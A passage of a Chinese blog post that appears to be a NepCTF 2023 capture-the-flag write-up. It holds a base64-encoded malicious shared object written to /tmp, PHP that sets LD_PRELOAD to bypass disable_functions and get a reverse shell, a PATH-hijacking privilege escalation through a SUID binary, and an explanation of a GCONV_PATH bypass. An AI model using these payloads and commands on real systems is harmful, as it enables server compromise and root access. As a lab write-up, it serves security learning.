AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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&quot;</span>);<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">saveHtmlFile</span>(<span class="hljs-string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="hljs-subst">$f</span>&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161314122.png" srcset="/img/loading.gif" lazyload alt="image-20230816131432064"></p>
+<p>成功写进去了</p>
+<p>接下来就是劫持环境变量，然后去执行这个恶意so文件中的函数即可：</p>
+<p>post:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/tmp/&quot;</span>));<br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/poc.so&quot;</span>);<br><span class="hljs-title function_ invoke__">mb_send_mail</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>反弹到shell了，接下来就需要提权了</p>
+<p>根目录下有个<code>showmsg</code>文件，具有s权限位</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161355332.png" srcset="/img/loading.gif" lazyload alt="image-20230816135505258"></p>
+<p>他的源码是src.c:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span> &#123;<br>        <span class="hljs-type">gid_t</span> gid;<br>        <span class="hljs-type">uid_t</span> uid;<br>        gid = getegid();<br>        uid = geteuid();<br><br>        setresgid(gid, gid, gid);<br>        setresuid(uid, uid, uid);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thank you! This is the final step.   --From lx56\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /tmp/resources/4.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>会调用到cat，很明显可以使用<strong>环境变量提权</strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">cd</span> /<br>./showmsg<br><span class="hljs-built_in">tac</span> flag<br></code></pre></td></tr></table></figure>
+
+<p>(cat被污染了，所以不能用cat)</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161400579.png" srcset="/img/loading.gif" lazyload alt="image-20230816140042520"></p>
+<h5 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h5><p>学到了<code>LFI2RCE</code> ，<code>LD_PRELOAD</code>绕过<code>disable_functions</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gle88r6ghcn1891u#yvenp">https://www.yuque.com/dat0u/ctf/gle88r6ghcn1891u#yvenp</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/#Ez-include">https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/#Ez-include</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4623#toc-7">https://xz.aliyun.com/t/4623#toc-7</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#error_log">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#error_log</a></p>
+<h5 id="法二：GCONV绕过disable-functions"><a href="#法二：GCONV绕过disable-functions" class="headerlink" title="法二：GCONV绕过disable_functions"></a>法二：GCONV绕过disable_functions</h5><p>原理：<a target="_blank" rel="noopener" href="https://www.wangan.com/p/7fy7fg4103b2ee22#%E5%88%A9%E7%94%A8GCONV_PATH%E4%B8%8Eiconv">https://www.wangan.com/p/7fy7fg4103b2ee22#%E5%88%A9%E7%94%A8GCONV_PATH%E4%B8%8Eiconv</a></p>
+<blockquote>
+<p>原理简介：</p>
+<p>php 在执行 iconv 函数时，实际上是调用 glibc 中的 iconv 相关函数，其中一个很重要的函数叫做 iconv_open()。</p>
+<p>linux 系统提供了一个环境变量：GCONV_PATH，该环境变量能够使 glibc 使用用户自定义的 gconv-modules 文件，因此，如果指定了 GCONV_PATH 的值，iconv_open 函数的执行过程会如下：</p>
+<p>1.iconv_open 函数依照 GCONV_PATH 找到 gconv-modules 文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so 文件中，即 gconv-modules 文件提供了各个字符集的.so 文件所在位置。</p>
+<ol start="2">
+<li><p>根据 gconv-modules 文件的指示找到参数对应的.so 文件。</p>
+</li>
+<li><p>调用.so 文件中的 gconv() 和 gonv_init() 函数。</p>
+</li>
+<li><p>一些其他步骤。</p>
+</li>
+</ol>
+<p>我们的利用方式就是首先在某一文件夹（一般是 &#x2F;tmp）中上传 gconv-modules 文件，文件中指定我们自定义的字符集文件的.so，然后我们再在.so 文件中的 gonv_init() 函数中书写命令执行函数，之后上传 php 的 shell，内容是使用 php 设定 GCONV_PATH 指向我们的 gconv-modules 文件，然后使用 iconv 函数使我们的恶意代码执行。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80">https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80</a></p>
+<h5 id="web参考："><a href="#web参考：" class="headerlink" title="web参考："></a>web参考：</h5><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/#Hive-it">https://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/#Hive-it</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gle88r6ghcn1891u#yvenp">https://www.yuque.com/dat0u/ctf/gle88r6ghcn1891u#yvenp</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NepCTF2023复现</div>
+      <div>https://leekosss.github.io/2023/08/13/[NepCTF2023]复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月13日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年8月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/bash_history%E6%96%87%E4%BB%B6/" title="bash_history文件">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">bash_history文件</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/19/%5Bvulnhub%5Doscp(SUID%E6%8F%90%E6%9D%83)/" title="vulnhub oscp SUID提权">
+                        <span class="hidden-mobile">vulnhub oscp SUID提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
